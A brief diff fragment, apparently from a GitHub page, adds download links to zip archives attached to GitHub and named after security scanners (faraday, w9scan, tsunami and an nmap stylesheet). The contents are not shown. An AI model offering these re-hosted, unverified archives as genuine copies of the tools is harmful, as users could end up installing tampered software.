@@ -4,7 +4,11 @@ _______________________________________________________________________
 ______________________________________________________________________
 
 
+[faraday-master.zip](https://github.com/user-attachments/files/16760639/faraday-master.zip)
+[nmap-bootstrap-xsl-stable.zip](https://github.com/user-attachments/files/16760638/nmap-bootstrap-xsl-stable.zip)
 
+[w9scan-master.zip](https://github.com/user-attachments/files/16760629/w9scan-master.zip)
+[tsunami-security-scanner-master.zip](https://github.com/user-attachments/files/16760628/tsunami-security-scanner-master.zip)
 
 
 
